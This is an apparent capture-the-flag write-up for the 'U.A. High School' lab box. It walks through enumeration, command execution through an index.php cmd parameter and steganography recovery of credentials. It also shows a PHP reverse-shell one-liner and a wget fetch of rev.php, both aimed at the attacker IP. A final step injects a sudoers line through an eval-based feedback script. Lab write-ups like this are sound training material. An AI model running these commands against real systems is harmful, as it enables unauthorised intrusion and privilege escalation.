# UA High School

>U.A. High School is a 'My Hero Acadamia' (Boku no Hero Academia) themed room created by Fede1781. The author has put a lot of love into the room, and it shows. Despite initial access taking some time it was great to finally get root on this machine. Many thanks to the creator.

<br>

> The room focuses on the need for solid enumeration techniques, remote code execution, reverse shells, steganography, cryptography as well as file signatures and shell script analysis.


## Enumeration
<br>

### Nmap Scan
---
```shell
└─$ nmap 10.10.224.64 -sC -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 15:52 EDT
Nmap scan report for 10.10.224.64
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
|_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.39 seconds
```
<br>

> The scan is showing Apache on port 80 and SSH on port 22, pretty standard for a web server. Scanning for anything higher did not provide any interesting or unusual ports. I opt to fire off a directory scan and browse the website for any clues etc. I added the IP to my hosts file and set the URL to uahighschool.thm and went on my way.

<br>

### Directory Enumeration
----

```shell
dirsearch -e conf,config,bak,backup,sql,asp,aspx,aspx~,asp~,py,py~,php,php~,bak,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log  -u http://uahighschool.thm/
```
<br>

> This turned out to only provide a few directories, assets, server, and assets/images. Browsing to assets, we are met with a blank page and not much to go on. images gives us a 403: Forbidden, as does /server-status. It appears I'm at a dead end.

<br>

### Subdomain Enumeration

> I'm left wondering if there are any subdomains / Vhosts that are the path forward, at this point I've tried multiple wordlists for directories / files and haven't found a path ahead. The hint states that we need to "enumerate thoroughly..." So let's try fuzzing some of the previously found directories.

<br>

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -u https://uahighschool.thm/assets/
```
<br>

```shell
 :: Method           : GET
 :: URL              : http://uahighschool.thm/assets/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 281
________________________________________________

images                  [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 220ms]
index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 218ms]
:: Progress: [4727/4727] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```
<br>

> Why is there an index.php in the assets directory..? Sometimes php files are used to call other things, like commands, pages, languages etc. So what are the odds that this is one of those times?

#### Much better way of fuzzing the parmater (Thank you to Jaxafed)

```shell
ffuf -u 'http://uahighschool.thm/assets/index.php?FUZZ=id' -mc all -ic -t 100 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -fs 0
```

<br>

```
cmd                     [Status: 200, Size: 72, Words: 1, Lines: 1, Duration: 124ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

<br>

> It can be passed commands via the php file... e.g. index.php?cmd=

<br>


<p align="center" width="100%">
    <img width="33%" src="https://github.com/user-attachments/assets/5ddd39b7-f388-4b96-872c-15adf883731c">
</p>

> It's base64 encoded...

<br>

```shell
echo "dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK" | base64 -d

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
<br>

> Huh, are you kidding me?? The hint for this question was absolutely spot on, I found nothing when I looked at it the first time, so I went on ahead with other methods. Had I enumerated more thoroughly I would have found this within the first day easily...

<br>

## Foothold

> Now that we can interact with the system, we can try to figure out a way to get an initial foothold, since we are able to use the command line pretty freely we could simply upload a PHP reverse shell.

#### Set up an HTTP server to Serve files

```shell
python3 -m http.server 8080
```

#### Setting Netcat to listen on port 4444

```shell
nc -lvnp 4444
```

### Reverse Shell (One Line Command)

> There are many methods that will work here, since we have such free usage of the command line. We could upload a PHP Reverse shell, or we could try some one line command line versions.

<br>

```php-one-liner
php%20-r%20%27%24sock%3Dfsockopen%28%2210.13.63.118%22%2C4444%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```
<br>

```shell
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.13.63.118] from (UNKNOWN) [10.10.224.64] 33200
id                                                                                                                  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
```

### Reverse Shell (PHP File)

```shell
http://uahighschool.thm/assets/index.php?cmd=wget%20http://10.13.63.118:8080/rev.php
```
<br>

```shell
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.13.63.118] from (UNKNOWN) [10.10.224.64] 33200
id                                                                                                                  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
```

## Exploration

<br>

> Now that we have a foothold on the system, we can stabilize the shell and begin to explore the system.

<br>

```shell
export TERM=xterm; python3 -c 'import pty;pty.spawn("/bin/bash")'
```
<br>

> We can see that there is a folder called images (as expected) but when we 'cd' to it we can now see that it contains two files, may as well grab them just incase there are useful for something such as steganography. I set up a web server on port 4445 on the victim machine, and simply used the browser to save the files I could also have just used wget / curl.

<br>

```shell
python3 -m http.server 4445
```
<br>

<p align="center" width="100%">
    <img width="33%" src="https://github.com/user-attachments/assets/d3fea185-4217-4467-a659-d4ac125454cb">
</p>

> Further exploration yields a passphrase.txt located in /var/www/Hidden_Content.

```shell
www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt
cat passphrase.txt
QWxsbWlnaHNoNonNoNoISEhCg==
www-data@myheroacademia:/var/www/Hidden_Content$
```

#### Translating the Base64 to Readable Text

```shell
echo "QWxsbWlnaHNoNonNoNoISEhCg==" | base64 -d
```

<br>

> We get a passphrase, I tried to login as the user Deku using this passphrase, but it was not the correct one. Looking around the machine some more nothing really stood out, so I decided to look over the images.

## Steganography

> After reviewing the pictures on my machine Yuei.jpg reveals a picture of the High School, but the other picture has something wrong with it. It claims to be a jpg but it's not displaying correctly...

<p align="center" width="100%">
    <img width="33%" src="https://github.com/user-attachments/assets/bcbeb52f-9f94-4a6d-9bcf-f2fde9bd8d8d">
</p>

<br>

<p align="center" width="100%">
    <img width="33%" src="https://github.com/user-attachments/assets/8ff42b7b-e2d0-4de6-8603-6b0edf3a7a9d">
</p>


```shell
└─$ steghide extract -sf oneforall.jpg
Enter passphrase: 
steghide: the file format of the file "oneforall.jpg" is not supported.
```
<br>

> Well that's unfortunate... I need to see what's going on with this file, maybe someone has modified it. I attempted to use binwalk to extract any files, but it was unsuccessful so at this point I decided to look at the magic bytes for the file. Unfortuantely I had a brain fart and could not remember what all HEX editors come bundled with Kali so I grabbed the first one that looked right.

<br>

> The magic bytes inidcate that the file is a PNG, not a JPG... it's labeled as a .jpg so let's change the magic bytes to match the jpg extension 
```FF D8 FF E0 00 10 4A 46 49 46 00 01```.

<br>

```shell
hexeditor -b oneforall.jpg
```
<br>

> after changing the 'file signature' I can now view the file and I'm treated to a cool shot of Deku surrounded by the former users of the One for All quirk! Moving back to what I suspect to be a hidden file I ran the steghide command again using the passphrase from the machine.

<br>

<p align="center" width="100%">
    <img width="33%" src="https://github.com/user-attachments/assets/3baf9b13-488c-4072-afa8-b5451f35a8e2">
</p>

<br>

```
└─$ steghide extract -sf oneforall.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".
```
<br>

> Score, we got a creds file reading the file reveals a Username:Password Combination...

<br>

```
deku:One?NoNoNoNoNo1/A
```
<br>

## Privilege Escalation

<br>

> I was able to use the credentials to 'su' to deku, but I wanted a more stable platform, so I tried the creds with SSH. Sure enough we have direct access to deku on the machine via SSH!

### Script
---

<br>

> Knowing that we have deku's password, we can do a cheeky ```sudo -l``` to determine if he has any cool privileges that can be abused. I realized in the excitement that I still needed the user flag!

<br>

```
cat /home/deku/user.txt | wc -c
33
```
<br>

```
deku@myheroacademia:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```
<br>

```
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```

<br>

```
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
```

<br>

> It seem's I can run a script as sudo. Upon investigating the script and trying foolishly to read the /root/root.txt for a quick win. I wondered if I could just write to any file, I noticed that the script is checking for many special characters, so, many options were off the table here. 

<br>

> I figured I could add myself as a user with a root shell, but why not just give myself keys to the castle and add to the sudoers file...

<br>

## Privilege Escalation

<br>

```
deku ALL=NOPASSWD: ALL >> /etc/sudoers
```

<br>

> It appears this is successful, so what happens if I use sudo su?

<br>

```
deku@myheroacademia:~$ sudo su
root@myheroacademia:/home/deku# 
```
<br>

> We have access to the root account :D

<br>

```
cat /root/root.txt | wc -c
794
```

<br>

> Wut?? This is not the usual size of a flag...

<br>

```
cat /root/root.txt
```

<br>

<p align="center" width="100%">
    <img width="33%" src="https://github.com/user-attachments/assets/355c01b1-ee77-4247-a0fe-a38274ca90db">
</p>


> We are now the No.1 Hero!!

<br>

# Summary

> This was a really cool themed box, it really reinforced the need for enumeration in depth and not just at the surface level, I wasted many hours trying things that didn't work just to find something that on the surface is so silly, but is so important for this type of work.

Edits: 

1) Shamelesly updated with a nice command from Jaxafed (credit added) that I hadn't used before.

2) Added pictures.
